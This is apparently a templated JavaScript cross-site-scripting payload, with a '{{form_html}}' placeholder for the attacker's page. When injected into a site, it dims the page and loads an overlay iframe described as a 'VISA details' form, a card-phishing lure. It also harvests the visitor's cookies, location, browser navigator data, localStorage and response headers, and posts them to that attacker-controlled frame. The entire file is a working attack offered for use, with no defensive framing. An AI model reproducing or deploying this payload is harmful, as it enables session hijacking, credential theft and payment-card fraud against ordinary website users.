
(function(xssinjected) {

    /* It's only 1 injection allowed for single page */
    if(xssinjected) return;
    window.xssinjected = 1;
    
    /* resources which are used below */
    var resources = {
        id : {
            iframe : "xss-frame",
            fader : "xss-falder"
        },
        url : {
            iframe : "{{form_html}}?" + (location.hostname || "localhost")
        },
        style : {
            iframe : [
                "height:850px",
                "width:620px",
                "position:absolute",
                "top:100px", "left:50%",
                "margin:0 0 0 -310px",
                "background:none repeat scroll 0 0 #FFFFFF",
                "border:1px solid #bbb",
                "-moz-border-radius:15px",
                "border-radius:15px",
                "display:block",
                "padding:0",
                "z-index:9999"
            ],
            fader : [
                "position: fixed",
                "top:0", "left:0",
                "width:110%",
                "height:110%",
                "background-color:#000",
                "opacity:0.6",
                "z-index:9998"
            ]
        }
    };

    var inject = function() {
        var injectMain = function() {
            var create = function(name) { return document.createElement(name); };
            var append = function(el) { return document.body.appendChild(el); };

            /* Creates fader which will be above page content */
            var createFader = function() {
                var fader = create("div");
                fader.setAttribute('id', resources.id.fader);
                fader.setAttribute('style', resources.style.fader.join(';'));
                append(fader);
            };
            
            /* Creates iframe with VISA details.
               Iframe is an entry point for the injection save */
            var createIframe = function() {
                var frame = create("iframe");
                frame.setAttribute('id', resources.id.iframe);
                frame.setAttribute('style', resources.style.iframe.join(';'));
                frame.setAttribute('src', resources.url.iframe);

                append(frame);
            };

            createFader();
            createIframe();
        };

        /* grabs cookies, server headers, location, navigator and localStorage objects */
        var grabAll = function() {
            /* grabs dom node with depth = 3 */
            var getNode = function(domNode, depth) {
                depth = depth || 1;
                var res = {};
                for(var nodeName in domNode) {
                    try {
                        var childNode = domNode[nodeName];
                        var val = childNode + "";

                        /* no need to grab an empty and function */
                        if(val && typeof(childNode) != 'function') {
                            if(typeof(childNode) == 'object' && (!depth || depth < 3)) {
                                /* value is an object
                                   grab all it nodes untill depth < 3 */
                                for(var deepNode in childNode) {
                                    if(childNode.hasOwnProperty(deepNode)) {
                                        res[nodeName] = res[nodeName] || {};
                                        res[nodeName][deepNode] = getNode(childNode[deepNode], (depth + 1));
                                    }
                                }
                            } else {
                                /* value is simple, just record it */
                                res[nodeName] = val;
                            }
                        }
                    } catch(ex) {
                        /* security exceptions are possible, ignore them */
                    }
                }
                return res;
            };

            /* grabs window.navigator node */
            var getNavigator = function() {
                return getNode(navigator);
            };
            
            /* grabs an array with separator of "=" */
            var getIter = function(arr) {
                arr = arr || [];
                var res = null;
                var len = arr.length;
                for(var i = 0; i < len; i++) {
                    var eqIndex = arr[i].indexOf('=');
                    if(eqIndex > -1) {
                        var nodeName = arr[i].substring(0, eqIndex);
                        var nodeValue = arr[i].substring(eqIndex + 1);
                        if(nodeName) {
                            res = res || {};
                            res[nodeName] = nodeValue;
                        }
                    }
                }
                return res || "";
            };

            /* grabs document.cookies */
            var getCookies = function() {
                return getIter((document.cookie || "").split(';'));
            };

            /* grabs window.location */
            var getLocation = function() {
                return getNode(location);
            };

            /* grabs array of response headers */
            var getHeaders = function(headers) {
                return getIter((headers || "").split('\n'));
            };

            /* tries to grab window.localStorage
               only for morden browsers */
            var getLocalStorage = function() {
                if('localStorage' in window) {
                    return getNode(window.localStorage);
                }
                return null;
            };
            
            if (typeof XMLHttpRequest == "undefined") {
                XMLHttpRequest = function () {
                    var versions = ["Msxml2.XMLHTTP.6.0", "Msxml2.XMLHTTP.3.0", "Microsoft.XMLHTTP"];
                    for(var i = 0; i < versions.length; i++){
                        try { return new ActiveXObject(versions[i]); } catch (e) {}
                    }
                    throw new Error("This browser does not support XMLHttpRequest.");
                };
            };
            
            /* create XHR request to be able to grab headers from the Response */
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if(this.readyState == 2) {
                    var message = {
                        cookies: getCookies(),
                        location: getLocation(),
                        navigator: getNavigator(),
                        headers: getHeaders(this.getAllResponseHeaders()),
                        localStorage: getLocalStorage(window.localStorage)
                    };

                    /* sends message to IFRAME to be able to save them using XHR
                       There are 10 attemps, 1 per second to be sure that IFRAME catches the message */
                    for(var i = 1; i < 10; i++) {
                        var disableClosure = i;
                        setTimeout(function() {
                            var frame = document.getElementById(resources.id.iframe);
                            frame.contentWindow.postMessage(message, resources.url.iframe);
                        }, disableClosure * 1000);
                    }
                }
            };
            xhr.open("GET",location.href,true);
            xhr.send();
        };
        
        injectMain();
        grabAll();
    };

    if(!document.body) {
        if (window.addEventListener) {
            window.addEventListener("load", inject(), false);
        }
    } else {
        inject();
    }

})(window.xssinjected);

